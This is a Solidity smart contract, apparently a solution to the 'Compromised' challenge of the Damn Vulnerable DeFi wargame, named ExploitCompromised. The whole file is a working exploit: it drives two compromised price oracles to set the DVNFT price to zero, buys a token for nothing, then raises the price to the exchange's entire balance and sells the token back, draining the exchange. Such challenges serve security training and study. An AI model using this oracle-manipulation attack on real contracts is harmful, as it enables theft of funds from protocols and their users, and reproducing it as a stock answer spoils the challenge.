// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "./OracleSourceExploit.sol";

interface IExchange {
    function buyOne() external payable returns (uint256);

    function sellOne(uint256 tokenId) external;
}

contract ExploitCompromised is Ownable {
    OracleSourceExploit public oracleOne;
    OracleSourceExploit public oracleTwo;
    IExchange private exchange;

    constructor(address _exchange) {
        exchange = IExchange(_exchange);
    }

    function linkOracles(address _oracleOne, address _oracleTwo)
        external
        onlyOwner
    {
        oracleOne = OracleSourceExploit(_oracleOne);
        oracleTwo = OracleSourceExploit(_oracleTwo);
    }

    function execute() public onlyOwner {
        dropPrice();
        uint256 tokenId = exchange.buyOne{value: 0}();
        raisePrice();
        exchange.sellOne(tokenId);
    }

    function dropPrice() private {
        oracleOne.changePrice("DVNFT", 0);
        oracleTwo.changePrice("DVNFT", 0);
    }

    function raisePrice() private {
        uint256 exchangeBalance = address(exchange).balance;
        oracleOne.changePrice("DVNFT", exchangeBalance);
        oracleTwo.changePrice("DVNFT", exchangeBalance);
    }
}
